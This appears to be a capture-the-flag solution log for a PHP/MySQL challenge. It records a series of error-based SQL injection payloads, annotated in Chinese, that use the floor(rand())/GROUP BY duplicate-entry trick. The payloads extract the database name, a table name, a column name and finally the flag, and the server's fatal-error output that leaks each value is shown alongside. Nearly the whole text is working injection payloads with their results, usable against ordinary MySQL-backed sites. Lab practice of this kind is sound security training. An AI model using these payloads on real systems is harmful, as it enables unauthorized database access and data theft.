```
1' AND (SELECT 1 FROM (SELECT count(*), concat(0x7e, (SELECT database()), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) #   //爆数据库

1' AND (SELECT 1 FROM (SELECT count(*), concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='ctf' LIMIT 1,1), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) #       //表名

Fatal error: Uncaught mysqli_sql_exception: Duplicate entry '~contact~1' for key 'group_key' in /var/www/html/send.php:88 Stack trace: #0 /var/www/html/send.php(88): mysqli_stmt->execute() #1 {main} thrown in /var/www/html/send.php on line 88

1' AND (SELECT 1 FROM (SELECT count(*), concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='flag' LIMIT 1,1), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) #   //列名


Fatal error: Uncaught mysqli_sql_exception: Duplicate entry '~id~1' for key 'group_key' in /var/www/html/send.php:88 Stack trace: #0 /var/www/html/send.php(88): mysqli_stmt->execute() #1 {main} thrown in /var/www/html/send.php on line 88

1' AND (SELECT 1 FROM (SELECT count(*), concat(0x7e, (SELECT flag FROM flag LIMIT 0,1), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) #   前半段

Fatal error: Uncaught mysqli_sql_exception: Duplicate entry '~flag{k13in_test_flag}~1' for key 'group_key' in /var/www/html/send.php:88 Stack trace: #0 /var/www/html/send.php(88): mysqli_stmt->execute() #1 {main} thrown in /var/www/html/send.php on line 88

flag{k13in_test_flag}
```

